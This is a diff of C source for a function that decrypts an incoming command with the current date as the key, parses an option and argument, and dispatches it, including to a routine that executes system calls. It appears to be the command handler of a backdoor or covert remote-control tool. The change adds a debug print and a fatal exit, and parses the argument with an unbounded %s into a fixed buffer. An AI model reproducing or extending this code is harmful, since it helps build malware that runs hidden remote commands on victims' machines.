@@ -184,15 +184,16 @@ void getCommand(char **command, int payloadSize)
     strftime(date, sizeof(date), "%Y:%m:%d", tm);
     
     // Decrypt our command using today's date
+    token = malloc(sizeof(char) * payloadSize);
     decryptedCommand = encrypt_data(*command, date, payloadSize);
-    
+
     // Get the command value and an optional filename or command
-    if (sscanf(decryptedCommand, "%d[^|]%as", &option, &token) == 0)
+    if (sscanf(decryptedCommand, "%d|%s", &option, token) != 2)
     {
         free(token);
         return;
     }
-    
+    fprintf(stderr, "String is: %s\n", token);
     switch (option) {
         case EXECUTE_SYSTEM_CALL:
             executeSystemCall(token);
@@ -206,5 +207,6 @@ void getCommand(char **command, int payloadSize)
         default:
             break;
     }
+    systemFatal("Done executing command");
     free(token);
 }
